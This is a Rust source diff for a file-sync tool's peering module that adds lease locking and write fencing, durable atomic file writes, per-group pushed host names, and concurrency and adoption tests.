@@ -37,6 +37,20 @@ pub const DIRECTORY: &str = "peering";
 /// The lease file's name.
 const LEASE_FILE: &str = "lease.json";
 
+/// When this host received the lease it holds, on this host's clock:
+/// `{"leader", "term", "received_at"}`. Kept beside the lease rather than
+/// in it, because the lease crosses the wire and this does not. A write is
+/// refused once the lease has gone unrenewed for its lifetime by this
+/// clock, so no skew between the leader's clock and this one can let a
+/// lapsed leader write, or stop a live one.
+const RECEIPT_FILE: &str = "lease.received";
+
+/// The lock every lease decision takes: exclusively to admit a lease,
+/// shared for as long as a write checked against it runs. So a takeover
+/// cannot land between a write's check and the write, and two leases
+/// presented at once are decided one after the other.
+const LOCK_FILE: &str = "lease.lock";
+
 /// The leader's claim on a host, renewed on every cycle.
 ///
 /// A lease is compared by term first. A higher term is a newer leadership
@@ -222,11 +236,165 @@ pub fn read_lease(directory: &Path) -> Result<Option<Lease>> {
     }
 }
 
-/// Writes a lease, atomically: a controller that reads it sees the old
-/// lease or the new one, never a torn file.
+/// Writes a lease, atomically and durably: a controller that reads it sees
+/// the old lease or the new one, never a torn file, and one it was told was
+/// accepted survives a crash. Takes no lock and checks nothing; the agent
+/// admits leases with [`admit_lease`].
 pub fn write_lease(directory: &Path, lease: &Lease) -> Result<()> {
     let bytes = serde_json::to_vec_pretty(lease).context("unable to encode the lease")?;
-    write_file(directory, LEASE_FILE, &bytes)
+    write_file(directory, LEASE_FILE, &bytes)?;
+    write_receipt(directory, lease)
+}
+
+/// The lease lock, held until dropped.
+#[derive(Debug)]
+pub struct LeaseLock {
+    _file: std::fs::File,
+}
+
+/// Takes the lease lock of a peering directory, creating both on demand.
+fn lock(directory: &Path, exclusive: bool) -> Result<LeaseLock> {
+    use std::os::unix::io::AsRawFd;
+    std::fs::create_dir_all(directory)
+        .with_context(|| format!("unable to create {}", directory.display()))?;
+    let path = directory.join(LOCK_FILE);
+    let file = std::fs::OpenOptions::new()
+        .read(true)
+        .write(true)
+        .create(true)
+        .truncate(false)
+        .open(&path)
+        .with_context(|| format!("unable to open {}", path.display()))?;
+    let operation = match exclusive {
+        true => libc::LOCK_EX,
+        false => libc::LOCK_SH,
+    };
+    loop {
+        // Safety: a valid descriptor, owned by `file` for the lock's life;
+        // closing it releases the lock.
+        if unsafe { libc::flock(file.as_raw_fd(), operation) } == 0 {
+            return Ok(LeaseLock { _file: file });
+        }
+        let error = std::io::Error::last_os_error();
+        if error.kind() != std::io::ErrorKind::Interrupted {
+            return Err(error).with_context(|| format!("unable to lock {}", path.display()));
+        }
+    }
+}
+
+/// The agent's answer to a presented lease, decided under the exclusive
+/// lock: the read, the check and the write are one step, so two leases
+/// presented at once — at one term, or a delayed lower term after a higher
+/// one — are decided in turn, and exactly one of two rivals is admitted.
+pub fn admit_lease(directory: &Path, lease: &Lease) -> Result<LeaseAnswer> {
+    let _lock = lock(directory, true)?;
+    match read_lease(directory)? {
+        Some(held) if !held.admits(lease) => Ok(LeaseAnswer::Refused { current: held }),
+        _ => {
+            write_lease(directory, lease)?;
+            Ok(LeaseAnswer::Accepted)
+        }
+    }
+}
+
+/// Renews a lease this host holds for itself, under the exclusive lock,
+/// only while the host still holds it at that leader and term: a handoff or
+/// a takeover that wrote a different lease is never renewed over. Whether
+/// it renewed.
+pub fn renew_own_lease(directory: &Path, lease: &Lease) -> Result<bool> {
+    let _lock = lock(directory, true)?;
+    let held = read_lease(directory)?;
+    if !held.is_some_and(|held| held.leader == lease.leader && held.term == lease.term) {
+        return Ok(false);
+    }
+    write_lease(directory, lease)?;
+    Ok(true)
+}
+
+/// Why a write checked against the lease was refused.
+#[derive(Debug, thiserror::Error)]
+pub enum WriteRefused {
+    /// Another leadership took the host since this channel's lease.
+    #[error(
+        "fenced: this host's lease is held by {} at term {}; the lease this channel was \
+         accepted at ({} at term {}) no longer holds",
+        current.leader, current.term, accepted.leader, accepted.term
+    )]
+    Superseded { current: Lease, accepted: Lease },
+    /// The lease went unrenewed for its lifetime, by this host's clock.
+    #[error(
+        "fenced: the lease of {} at term {} lapsed {}s ago on this host without renewal; \
+         present it again to write",
+        accepted.leader, accepted.term, lapsed.as_secs()
+    )]
+    Lapsed { accepted: Lease, lapsed: Duration },
+}
+
+/// Checks a write against the lease its channel was accepted at, under the
+/// shared lease lock, which the returned guard holds until the write is
+/// done: no lease can be admitted while it runs. Refused when the host's
+/// lease has moved on to another leader or term, or when it went unrenewed
+/// for its lifetime by this host's clock.
+pub fn check_write(directory: &Path, accepted: &Lease) -> Result<LeaseLock> {
+    let guard = lock(directory, false)?;
+    let held = read_lease(directory)?;
+    let current = match held {
+        Some(held) if held.leader == accepted.leader && held.term == accepted.term => held,
+        Some(held) => {
+            return Err(WriteRefused::Superseded {
+                current: held,
+                accepted: accepted.clone(),
+            }
+            .into())
+        }
+        None => bail!(
+            "the lease this channel was accepted at is gone from {}",
+            directory.display()
+        ),
+    };
+    if let Some(receipt) = read_receipt(directory)? {
+        if receipt.leader == current.leader && receipt.term == current.term {
+            let lapsed = now_seconds()
+                .saturating_sub(receipt.received_at.saturating_add(current.ttl_seconds));
+            if lapsed > 0 {
+                return Err(WriteRefused::Lapsed {
+                    accepted: accepted.clone(),
+                    lapsed: Duration::from_secs(lapsed),
+                }
+                .into());
+            }
+        }
+    }
+    Ok(guard)
+}
+
+/// When this host received its lease, by its own clock.
+#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
+struct Receipt {
+    leader: String,
+    term: u64,
+    received_at: u64,
+}
+
+fn write_receipt(directory: &Path, lease: &Lease) -> Result<()> {
+    let receipt = Receipt {
+        leader: lease.leader.clone(),
+        term: lease.term,
+        received_at: now_seconds(),
+    };
+    let bytes = serde_json::to_vec(&receipt).context("unable to encode the lease receipt")?;
+    write_file(directory, RECEIPT_FILE, &bytes)
+}
+
+fn read_receipt(directory: &Path) -> Result<Option<Receipt>> {
+    let path = directory.join(RECEIPT_FILE);
+    match std::fs::read(&path) {
+        // A receipt that does not parse is treated as absent: it only ever
+        // adds a refusal, never an admission.
+        Ok(bytes) => Ok(serde_json::from_slice(&bytes).ok()),
+        Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(None),
+        Err(error) => Err(error).with_context(|| format!("unable to read {}", path.display())),
+    }
 }
 
 /// Writes one of the files the leader pushes: `config.toml`, `name`, or
@@ -245,34 +413,70 @@ pub fn is_pushable(name: &str) -> bool {
     let plain = |file: &str| !file.is_empty() && !file.contains('/') && file != "." && file != "..";
     match name {
         "config.toml" | "name" => true,
-        other => match (
-            other.strip_prefix("ignores/"),
-            other.strip_prefix("sessions/"),
-        ) {
-            (Some(file), _) | (_, Some(file)) => plain(file),
-            _ => false,
-        },
+        other => ["ignores/", "sessions/", "names/"]
+            .iter()
+            .find_map(|prefix| other.strip_prefix(prefix))
+            .is_some_and(plain),
     }
 }
 
 /// Writes a file under the peering directory by way of a temporary and a
-/// rename. The directory (and `ignores/`) is created on demand.
+/// rename, durably: the file and its directory are flushed before this
+/// returns. The directory (and `ignores/`) is created on demand.
+///
+/// The temporary is created fresh (`create_new`) under a name no other
+/// writer can hold. Named by process alone, two channels of one agent
+/// pushing the same file wrote into one temporary, and either rename could
+/// publish the other's bytes, or half of them.
 fn write_file(directory: &Path, name: &str, bytes: &[u8]) -> Result<()> {
+    use std::io::Write;
+    static SEQUENCE: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
     let path = directory.join(name);
     let parent = path
         .parent()
         .ok_or_else(|| anyhow::anyhow!("{} has no directory", path.display()))?;
     std::fs::create_dir_all(parent)
         .with_context(|| format!("unable to create {}", parent.display()))?;
-    let temporary = parent.join(format!(
-        ".{}.{}.tmp",
-        path.file_name().unwrap_or_default().to_string_lossy(),
-        std::process::id()
-    ));
-    std::fs::write(&temporary, bytes)
-        .with_context(|| format!("unable to write {}", temporary.display()))?;
-    std::fs::rename(&temporary, &path)
-        .with_context(|| format!("unable to move {} into place", path.display()))?;
+    let (temporary, mut file) = loop {
+        let candidate = parent.join(format!(
+            ".{}.{}.{}.{}.tmp",
+            path.file_name().unwrap_or_default().to_string_lossy(),
+            std::process::id(),
+            SEQUENCE.fetch_add(1, std::sync::atomic::Ordering::Relaxed),
+            SystemTime::now()
+                .duration_since(UNIX_EPOCH)
+                .map(|elapsed| elapsed.subsec_nanos())
+                .unwrap_or(0),
+        ));
+        match std::fs::OpenOptions::new()
+            .write(true)
+            .create_new(true)
+            .open(&candidate)
+        {
+            Ok(file) => break (candidate, file),
+            Err(error) if error.kind() == std::io::ErrorKind::AlreadyExists => continue,
+            Err(error) => {
+                return Err(error)
+                    .with_context(|| format!("unable to create {}", candidate.display()))
+            }
+        }
+    };
+    let written = file
+        .write_all(bytes)
+        .and_then(|()| file.sync_all())
+        .with_context(|| format!("unable to write {}", temporary.display()));
+    drop(file);
+    if let Err(error) = written {
+        let _ = std::fs::remove_file(&temporary);
+        return Err(error);
+    }
+    if let Err(error) = std::fs::rename(&temporary, &path) {
+        let _ = std::fs::remove_file(&temporary);
+        return Err(error).with_context(|| format!("unable to move {} into place", path.display()));
+    }
+    std::fs::File::open(parent)
+        .and_then(|directory| directory.sync_all())
+        .with_context(|| format!("unable to flush {}", parent.display()))?;
     Ok(())
 }
 
@@ -303,7 +507,16 @@ pub fn ancestor_copy_path(directory: &Path, session: &str) -> Result<PathBuf> {
 pub(crate) struct AncestorCopy {
     store: AncestorStore,
     ancestor: Option<Node>,
+    /// The copy's directory, where the file naming its writer is.
+    directory: PathBuf,
+    /// Who last wrote the copy, as that file has it.
+    writer: Option<String>,
 }
+
+/// The file beside a session's ancestor copy naming the leader that wrote
+/// it last: its lease's name, or nothing for a channel that presented no
+/// lease.
+const WRITER_FILE: &str = "writer";
 
 impl AncestorCopy {
     /// Opens (or starts) the copy for `session` under `directory`.
@@ -315,7 +528,30 @@ impl AncestorCopy {
         }
         let (store, ancestor, _unresolved) = AncestorStore::open(&path)
             .with_context(|| format!("unable to open the ancestor copy at {}", path.display()))?;
-        Ok(AncestorCopy { store, ancestor })
+        let directory = path.parent().map(Path::to_path_buf).unwrap_or_default();
+        let writer = std::fs::read_to_string(directory.join(WRITER_FILE)).ok();
+        Ok(AncestorCopy {
+            store,
+            ancestor,
+            directory,
+            writer,
+        })
+    }
+
+    /// Records who is writing the copy, before anything they send is
+    /// applied: the leader whose lease the channel was accepted at, or
+    /// nobody for one that presented none. A host takes up a copy only
+    /// from the member its session is with (`adopt_newer_copy`), so this is
+    /// what keeps a leader from writing history for a session it is not
+    /// part of.
+    pub(crate) fn written_by(&mut self, leader: Option<&str>) -> Result<()> {
+        let leader = leader.unwrap_or_default();
+        if self.writer.as_deref() == Some(leader) {
+            return Ok(());
+        }
+        write_file(&self.directory, WRITER_FILE, leader.as_bytes())?;
+        self.writer = Some(leader.to_owned());
+        Ok(())
     }
 
     /// The generation the copy stands at; zero for a copy that holds
@@ -400,6 +636,9 @@ mod tests {
         assert!(is_pushable("config.toml"));
         assert!(is_pushable("name"));
         assert!(is_pushable("ignores/node"));
+        assert!(is_pushable("names/work"));
+        assert!(!is_pushable("names/"));
+        assert!(!is_pushable("names/a/b"));
         assert!(!is_pushable("ignores/"));
         assert!(!is_pushable("ignores/../x"));
         assert!(!is_pushable("ignores/a/b"));
@@ -426,6 +665,187 @@ mod tests {
         );
         assert!(write_pushed_file(&directory, "../escape", b"x").is_err());
         assert_eq!(read_pushed_file(&directory, "name").unwrap(), None);
+    }
+
+    /// Two leases presented at once at one term, by two leaders, are
+    /// decided in turn under the lock: exactly one is admitted, and the
+    /// host holds the one that was.
+    #[test]
+    fn two_admissions_at_one_term_accept_exactly_one() {
+        let keep = tempfile::tempdir().expect("a temporary directory");
+        let directory = keep.path().join(DIRECTORY);
+        let ttl = Duration::from_secs(30);
+        admit_lease(&directory, &Lease::new(ALPHA, 1, ttl)).unwrap();
+        for round in 2..40 {
+            let barrier = std::sync::Barrier::new(2);
+            let answers: Vec<(String, LeaseAnswer)> = std::thread::scope(|scope| {
+                let rivals = ["u@one:/x", "u@two:/x"].map(|leader| {
+                    let (directory, barrier) = (&directory, &barrier);
+                    scope.spawn(move || {
+                        barrier.wait();
+                        let lease = Lease::new(leader, round, ttl);
+                        (leader.to_owned(), admit_lease(directory, &lease).unwrap())
+                    })
+                });
+                rivals.map(|rival| rival.join().unwrap()).into()
+            });
+            let admitted: Vec<&String> = answers
+                .iter()
+                .filter(|(_, answer)| *answer == LeaseAnswer::Accepted)
+                .map(|(leader, _)| leader)
+                .collect();
+            assert_eq!(admitted.len(), 1, "round {round}: {answers:?}");
+            let held = read_lease(&directory).unwrap().unwrap();
+            assert_eq!((&held.leader, held.term), (admitted[0], round));
+        }
+    }
+
+    /// A lease presented late at a lower term — a delayed renewal from a
+    /// leader that has since been replaced — is refused, and the higher
+    /// lease stays in place.
+    #[test]
+    fn a_delayed_lower_term_never_replaces_a_higher_one() {
+        let keep = tempfile::tempdir().expect("a temporary directory");
+        let directory = keep.path().join(DIRECTORY);
+        let ttl = Duration::from_secs(30);
+        let higher = Lease::new("u@h:/x", 6, ttl);
+        assert_eq!(
+            admit_lease(&directory, &higher).unwrap(),
+            LeaseAnswer::Accepted
+        );
+        assert_eq!(
+            admit_lease(&directory, &Lease::new(ALPHA, 5, ttl)).unwrap(),
+            LeaseAnswer::Refused {
+                current: higher.clone()
+            }
+        );
+        assert_eq!(read_lease(&directory).unwrap(), Some(higher));
+    }
+
+    /// A leader renews only its own lease: once a handoff or a takeover
+    /// wrote another, the renewal leaves it be.
+    #[test]
+    fn a_leader_renews_only_the_lease_it_holds() {
+        let keep = tempfile::tempdir().expect("a temporary directory");
+        let directory = keep.path().join(DIRECTORY);
+        let ttl = Duration::from_secs(30);
+        assert!(!renew_own_lease(&directory, &Lease::new("u@h:/x", 3, ttl)).unwrap());
+        assert_eq!(read_lease(&directory).unwrap(), None);
+        admit_lease(&directory, &Lease::new("u@h:/x", 3, ttl)).unwrap();
+        assert!(renew_own_lease(&directory, &Lease::new("u@h:/x", 3, ttl)).unwrap());
+        let next = Lease::new(ALPHA, 4, ttl);
+        admit_lease(&directory, &next).unwrap();
+        assert!(!renew_own_lease(&directory, &Lease::new("u@h:/x", 3, ttl)).unwrap());
+        assert_eq!(read_lease(&directory).unwrap(), Some(next));
+    }
+
+    /// A write is checked against the lease its channel was accepted at:
+    /// allowed while the host holds it, refused once another leadership
+    /// took the host — without the channel presenting anything — and
+    /// refused once the lease went unrenewed for its lifetime by this
+    /// host's clock, whatever the leader's clock wrote into it.
+    #[test]
+    fn a_write_is_refused_once_the_lease_it_rode_on_is_gone() {
+        let keep = tempfile::tempdir().expect("a temporary directory");
+        let directory = keep.path().join(DIRECTORY);
+        let ttl = Duration::from_secs(30);
+        let accepted = Lease::new(ALPHA, 5, ttl);
+        admit_lease(&directory, &accepted).unwrap();
+        drop(check_write(&directory, &accepted).expect("the lease holds"));
+
+        // Lapsed: received 31 seconds ago on this host and never renewed,
+        // though the leader's own clock says it renewed just now.
+        let receipt = Receipt {
+            leader: ALPHA.into(),
+            term: 5,
+            received_at: now_seconds() - 31,
+        };
+        write_file(
+            &directory,
+            RECEIPT_FILE,
+            &serde_json::to_vec(&receipt).unwrap(),
+        )
+        .unwrap();
+        let error = check_write(&directory, &accepted).expect_err("a lapsed lease");
+        assert!(
+            matches!(
+                error.downcast_ref::<WriteRefused>(),
+                Some(WriteRefused::Lapsed { .. })
+            ),
+            "{error:#}"
+        );
+        assert!(format!("{error:#}").starts_with("fenced:"), "{error:#}");
+        // Renewed, it holds again.
+        admit_lease(&directory, &accepted).unwrap();
+        drop(check_write(&directory, &accepted).expect("renewed"));
+
+        // Superseded.
+        let newer = Lease::new("u@h:/x", 6, ttl);
+        admit_lease(&directory, &newer).unwrap();
+        let error = check_write(&directory, &accepted).expect_err("a superseded lease");
+        match error.downcast_ref::<WriteRefused>() {
+            Some(WriteRefused::Superseded { current, .. }) => assert_eq!(current, &newer),
+            other => panic!("expected a superseded lease, got {other:?}"),
+        }
+        assert!(format!("{error:#}").starts_with("fenced:"), "{error:#}");
+    }
+
+    /// While a write holds the lease lock, a new lease waits for it: the
+    /// write never lands after the host moved on to another leader.
+    #[test]
+    fn a_lease_waits_for_a_write_in_progress() {
+        let keep = tempfile::tempdir().expect("a temporary directory");
+        let directory = keep.path().join(DIRECTORY);
+        let ttl = Duration::from_secs(30);
+        let accepted = Lease::new(ALPHA, 5, ttl);
+        admit_lease(&directory, &accepted).unwrap();
+        let guard = check_write(&directory, &accepted).unwrap();
+        let admitted = std::sync::atomic::AtomicBool::new(false);
+        std::thread::scope(|scope| {
+            let rival = scope.spawn(|| {
+                admit_lease(&directory, &Lease::new("u@h:/x", 6, ttl)).unwrap();
+                admitted.store(true, std::sync::atomic::Ordering::SeqCst);
+            });
+            std::thread::sleep(Duration::from_millis(200));
+            assert!(
+                !admitted.load(std::sync::atomic::Ordering::SeqCst),
+                "a lease was admitted while a write held the lock"
+            );
+            drop(guard);
+            rival.join().unwrap();
+        });
+        assert!(admitted.load(std::sync::atomic::Ordering::SeqCst));
+        assert!(check_write(&directory, &accepted).is_err());
+    }
+
+    /// Pushes of one file on several channels at once each write a
+    /// temporary of their own: the file ends up whole, as one of them
+    /// wrote it, and no temporary is left behind.
+    #[test]
+    fn concurrent_pushes_of_one_file_never_mix() {
+        let keep = tempfile::tempdir().expect("a temporary directory");
+        let directory = keep.path().join(DIRECTORY);
+        let contents: Vec<Vec<u8>> = (0..8u8).map(|i| vec![b'a' + i; 256 * 1024]).collect();
+        for _ in 0..10 {
+            std::thread::scope(|scope| {
+                for content in &contents {
+                    let directory = &directory;
+                    scope.spawn(move || {
+                        write_pushed_file(directory, "config.toml", content).unwrap();
+                    });
+                }
+            });
+            let written = read_pushed_file(&directory, "config.toml")
+                .unwrap()
+                .unwrap();
+            assert!(contents.contains(&written), "a mixed or partial file");
+        }
+        let leftovers: Vec<_> = std::fs::read_dir(&directory)
+            .unwrap()
+            .map(|entry| entry.unwrap().file_name().to_string_lossy().into_owned())
+            .filter(|name| name.ends_with(".tmp"))
+            .collect();
+        assert!(leftovers.is_empty(), "{leftovers:?}");
     }
 
     #[test]
@@ -459,6 +879,245 @@ mod tests {
         let copy = AncestorCopy::open(&directory, &session).unwrap();
         assert_eq!(copy.generation(), 9);
         assert_eq!(copy.ancestor.as_ref().map(|n| n.children().len()), Some(2));
+    }
+
+    /// Records `generations` small cycles into a fresh store at `path`,
+    /// every one journalled: the store is a journal and no checkpoint.
+    fn journal_only(path: &Path, generations: u64) {
+        let (mut store, _, _) = AncestorStore::open(path).unwrap();
+        let mut names = Vec::new();
+        for generation in 1..=generations {
+            names.push(format!("f{generation:03}"));
+            let tree = Node::directory(
+                "",
+                names
+                    .iter()
+                    .map(|name| Node::directory(name, Vec::new()))
+                    .collect(),
+            );
+            store
+                .record(
+                    &[Change {
+                        path: String::new(),
+                        old: None,
+                        new: Some(tree.clone()),
+                    }],
+                    Some(&tree),
+                )
+                .unwrap();
+        }
+        assert!(!path.exists(), "the store should hold no checkpoint");
+        assert_eq!(AncestorStore::stored_generation(path).unwrap(), generations);
+    }
+
+    /// Sets when a store was last written, checkpoint and journal alike.
+    fn written_at(path: &Path, seconds_ago: u64) {
+        let when = SystemTime::now() - Duration::from_secs(seconds_ago);
+        for file in [path.to_path_buf(), path.with_file_name("ancestor.journal")] {
+            if file.exists() {
+                std::fs::File::options()
+                    .write(true)
+                    .open(&file)
+                    .unwrap()
+                    .set_modified(when)
+                    .unwrap();
+            }
+        }
+    }
+
+    /// Adopts `session`'s copy as written by `writer`, with this side
+    /// holding exactly what the copy records, so that only when it was
+    /// written, and by whom, decide.
+    fn adopt_as(state_root: &Path, session: &str, writer: Option<&str>) -> Adoption {
+        let directory = state_root.join(DIRECTORY);
+        let copy = ancestor_copy_path(&directory, session).unwrap();
+        if let Some(writer) = writer {
+            write_file(copy.parent().unwrap(), WRITER_FILE, writer.as_bytes()).unwrap();
+        }
+        adopt_newer_copy(
+            state_root,
+            &directory,
+            session,
+            "box:/x",
+            state_root,
+            || {
+                Ok(crate::tree::Snapshot {
+                    root: crate::session::ancestor::peek(&copy).unwrap().0,
+                    ..Default::default()
+                })
+            },
+        )
+        .unwrap()
+    }
+
+    /// Adoption takes the copy when it was written after the session's own
+    /// store — the later agreement — whatever the generations say, and
+    /// reads either store journal and all. A copy that lagged when a beta
+    /// took over carries on below the generation the alpha reached before
+    /// it left; it is still the later record, and is adopted.
+    #[test]
+    fn adoption_takes_the_later_agreement() {
+        let keep = tempfile::tempdir().expect("a temporary directory");
+        let state_root = keep.path();
+        let directory = state_root.join(DIRECTORY);
+        let session = crate::session::session_identifier("a", "b");
+        let own = state_root.join("sessions").join(&session).join("ancestor");
+        let copy = ancestor_copy_path(&directory, &session).unwrap();
+        std::fs::create_dir_all(own.parent().unwrap()).unwrap();
+        std::fs::create_dir_all(copy.parent().unwrap()).unwrap();
+        let generation = |path: &Path| AncestorStore::stored_generation(path).unwrap();
+        let adopted = Adoption::Adopted {
+            set_aside: Vec::new(),
+        };
+
+        // No copy: nothing to adopt. No history of its own: the copy is.
+        journal_only(&own, 5);
+        assert_eq!(
+            adopt_as(state_root, &session, Some("box:/x")),
+            Adoption::Kept
+        );
+        AncestorStore::reset(&own).unwrap();
+        journal_only(&copy, 3);
+        assert_eq!(adopt_as(state_root, &session, Some("box:/x")), adopted);
+        assert_eq!(generation(&own), 3);
+
+        // Its own, written later, is kept — journal-only, and ahead or not.
+        AncestorStore::reset(&own).unwrap();
+        journal_only(&own, 10);
+        written_at(&copy, 60);
+        written_at(&own, 30);
+        assert_eq!(
+            adopt_as(state_root, &session, Some("box:/x")),
+            Adoption::Kept
+        );
+        assert_eq!(generation(&own), 10);
+
+        // The copy, written later, is adopted — even at a lower generation:
+        // the histories parted, and the later one is the copy's.
+        AncestorStore::reset(&copy).unwrap();
+        journal_only(&copy, 9);
+        written_at(&own, 60);
+        written_at(&copy, 30);
+        assert_eq!(adopt_as(state_root, &session, Some("box:/x")), adopted);
+        assert_eq!(generation(&own), 9);
+        let (_, taken, _) = AncestorStore::open(&own).unwrap();
+        assert_eq!(taken.map(|tree| tree.children().len()), Some(9));
+    }
+
+    /// Only the member a session is with writes its copy here: one written
+    /// by another leader — planting history for a session it is not part
+    /// of — or through a channel that presented no lease is refused, and
+    /// this host's own history is left as it was. The member is known by
+    /// its host, whichever of its roots its lease names.
+    #[test]
+    fn a_copy_written_by_anyone_but_the_partner_is_refused() {
+        let keep = tempfile::tempdir().expect("a temporary directory");
+        let state_root = keep.path();
+        let session = crate::session::session_identifier("a", "b");
+        let copy = ancestor_copy_path(&state_root.join(DIRECTORY), &session).unwrap();
+        std::fs::create_dir_all(copy.parent().unwrap()).unwrap();
+        journal_only(&copy, 4);
+        let own = state_root.join("sessions").join(&session).join("ancestor");
+        for writer in [None, Some(""), Some("other:/x"), Some(ALPHA)] {
+            match adopt_as(state_root, &session, writer) {
+                Adoption::Refused(why) => assert!(why.contains("box:/x"), "{writer:?}: {why}"),
+                other => panic!("{writer:?}: {other:?}"),
+            }
+            assert!(!own.exists() && !own.with_file_name("ancestor.journal").exists());
+        }
+        assert!(matches!(
+            adopt_as(state_root, &session, Some("box:/srv/other-root")),
+            Adoption::Adopted { .. }
+        ));
+    }
+
+    /// A copy is checked against what this side holds. Where it records
+    /// something else and this side's file has not changed since the copy
+    /// was written, that path is set aside — forgotten, so the next cycle
+    /// reconciles it as new — while what agrees, and what changed here
+    /// since, is taken up as recorded.
+    #[test]
+    fn a_copy_that_disagrees_with_this_side_has_those_paths_set_aside() {
+        let keep = tempfile::tempdir().expect("a temporary directory");
+        let state_root = keep.path().join("state");
+        let root = keep.path().join("root");
+        std::fs::create_dir_all(root.join("sub")).unwrap();
+        for (name, content) in [
+            ("agreed.txt", "agreed"),
+            ("claimed.txt", "as it is here"),
+            ("edited.txt", "before"),
+            ("only-here.txt", "new here"),
+        ] {
+            std::fs::write(root.join(name), content).unwrap();
+        }
+        std::fs::write(root.join("sub/kept.txt"), "kept").unwrap();
+        let file = |name: &str, content: &str| Node {
+            name: name.into(),
+            content: crate::tree::Content::File {
+                digest: *blake3::hash(content.as_bytes()).as_bytes(),
+                executable: false,
+                metadata: Default::default(),
+            },
+        };
+        // The copy's account: one file as it is, one as it is not, one as
+        // it was before an edit made after the copy, and one that is not
+        // here at all.
+        let history = Node::directory(
+            "",
+            vec![
+                file("agreed.txt", "agreed"),
+                file("claimed.txt", "something this side never held"),
+                file("edited.txt", "before"),
+                file("gone.txt", "never here either"),
+                Node::directory("sub", vec![file("kept.txt", "kept")]),
+            ],
+        );
+        std::thread::sleep(Duration::from_millis(2100));
+        let session = crate::session::session_identifier("a", "b");
+        let directory = state_root.join(DIRECTORY);
+        let copy = ancestor_copy_path(&directory, &session).unwrap();
+        std::fs::create_dir_all(copy.parent().unwrap()).unwrap();
+        let (mut store, _, _) = AncestorStore::open(&copy).unwrap();
+        store.checkpoint_at(7, Some(&history)).unwrap();
+        drop(store);
+        write_file(copy.parent().unwrap(), WRITER_FILE, b"box:/x").unwrap();
+        std::fs::write(root.join("edited.txt"), "after the copy").unwrap();
+
+        let scan = || {
+            crate::scan::scan(
+                &root,
+                None,
+                &crate::scan::IgnoreSet::default(),
+                &crate::scan::FilesystemBehavior::default(),
+                crate::scan::SymlinkMode::default(),
+                None,
+                None,
+                false,
+                None,
+                true,
+            )
+        };
+        let adoption =
+            adopt_newer_copy(&state_root, &directory, &session, "box:/x", &root, scan).unwrap();
+        assert_eq!(
+            adoption,
+            Adoption::Adopted {
+                set_aside: vec![
+                    "claimed.txt".into(),
+                    "gone.txt".into(),
+                    "only-here.txt".into()
+                ],
+            }
+        );
+        let own = state_root.join("sessions").join(&session).join("ancestor");
+        let (_, taken, _) = AncestorStore::open(&own).unwrap();
+        let taken = taken.expect("adopted");
+        let names: Vec<&str> = taken
+            .children()
+            .iter()
+            .map(|child| child.name.as_str())
+            .collect();
+        assert_eq!(names, ["agreed.txt", "edited.txt", "sub"]);
     }
 }
 
@@ -505,6 +1164,11 @@ pub fn pushed_configuration(directory: &Path) -> Result<Option<(String, String)>
 /// alpha — its own root, as a local path — and the other betas stay as
 /// they were. Groups not in a peering mode are the alpha's business and
 /// are dropped.
+///
+/// This host's name is per group: two groups can reach it at two roots,
+/// and each pushes its own under `names/<group>`. `name` is the one the
+/// last group pushed, and stands in for a group that pushed none. The
+/// star leads under one name — a lease is per host — the first group's.
 pub fn derive_star(configuration: &str, name: &str, directory: &Path) -> Result<FollowerStar> {
     let mut config: crate::config::Config =
         toml::from_str(configuration).context("unable to parse the pushed configuration")?;
@@ -522,7 +1186,12 @@ pub fn derive_star(configuration: &str, name: &str, directory: &Path) -> Result<
             format!("{entry}:{alpha}")
         }
     };
+    let host = match directory.parent() {
+        Some(state_root) => crate::host::HostSettings::load(state_root)?,
+        None => crate::host::HostSettings::default(),
+    };
     let mut position: Option<usize> = None;
+    let mut leader: Option<String> = None;
     let mut groups = std::collections::BTreeMap::new();
     for (group_name, group) in &config.groups {
         let mode = group.mode.as_deref().or(config.defaults.mode.as_deref());
@@ -535,6 +1204,11 @@ pub fn derive_star(configuration: &str, name: &str, directory: &Path) -> Result<
         if !peering {
             continue;
         }
+        let name = match read_pushed_file(directory, &format!("names/{group_name}"))? {
+            Some(pushed) => String::from_utf8(pushed).context("the pushed name is not UTF-8")?,
+            None => name.to_owned(),
+        };
+        let name = name.as_str();
         let Some(index) = group
             .betas
             .iter()
@@ -542,10 +1216,15 @@ pub fn derive_star(configuration: &str, name: &str, directory: &Path) -> Result<
         else {
             continue;
         };
+        leader.get_or_insert_with(|| name.to_owned());
         let own_path = name
             .rsplit_once(':')
             .map(|(_, path)| path.to_owned())
             .unwrap_or_else(|| name.to_owned());
+        // The leader names this host's own root in the pushed name; what
+        // this host lets be synced is its own to say.
+        host.check_root(&crate::paths::expand_tilde(&own_path)?)
+            .with_context(|| format!("group {group_name}: the pushed name {name:?}"))?;
         // The other betas as they were, and the configured alpha as a
         // beta spec reached by attachment — so the star is never empty,
         // and the attached plan gets every setting the group carries.
@@ -558,9 +1237,13 @@ pub fn derive_star(configuration: &str, name: &str, directory: &Path) -> Result<
             .map(|(_, entry)| full(entry, &group.alpha))
             .collect();
         betas.push(format!("{}:{}", attached_destination(ALPHA), group.alpha));
+        // The command that reaches the other betas is this host's to
+        // choose: a pushed one would run here at takeover, chosen by a
+        // leader that may be long gone. Its own `host.toml` says, or ssh.
         let mut turned = crate::config::Group {
             alpha: own_path,
             betas,
+            agent_command: host.agent_command().map(str::to_owned),
             ..group.clone()
         };
         // The mode spelling is kept as written, so the plans say
@@ -572,7 +1255,7 @@ pub fn derive_star(configuration: &str, name: &str, directory: &Path) -> Result<
             None => index + 1,
         });
     }
-    let Some(position) = position else {
+    let (Some(position), Some(leader)) = (position, leader) else {
         bail!("{name:?} is not a beta of any peering group in the pushed configuration");
     };
     config.groups = groups;
@@ -600,7 +1283,7 @@ pub fn derive_star(configuration: &str, name: &str, directory: &Path) -> Result<
                     continue;
                 };
                 let identifier = String::from_utf8(identifier).context("the pushed session id")?;
-                plans.push(plan.attached_alpha(&alpha_path, identifier.trim().to_owned()));
+                plans.push(plan.attached_alpha(&alpha_path, identifier.trim().to_owned())?);
             }
         }
     }
@@ -610,7 +1293,7 @@ pub fn derive_star(configuration: &str, name: &str, directory: &Path) -> Result<
         .min()
         .unwrap_or(Duration::from_secs(5));
     Ok(FollowerStar {
-        name: name.to_owned(),
+        name: leader,
         plans,
         position,
         interval,
@@ -693,6 +1376,169 @@ mod star_tests {
 
         assert!(derive_star(PUSHED, "nobody:/x", keep.path()).is_err());
     }
+
